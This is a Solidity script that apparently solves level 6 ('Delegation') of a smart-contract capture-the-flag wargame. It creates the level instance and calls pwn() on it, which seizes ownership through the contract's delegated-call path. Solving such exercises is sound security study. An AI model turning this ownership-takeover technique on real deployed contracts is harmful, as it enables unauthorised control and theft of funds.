// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IDelegation.sol";

contract SolveLevel6 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0xBA97454449c10a0F04297022646E7750b8954EE8;
        value = 0;
    }

    function solveLevel(address instanceAddress) internal override {
        IDelegation instance = IDelegation(instanceAddress);

        instance.pwn();
    }
}
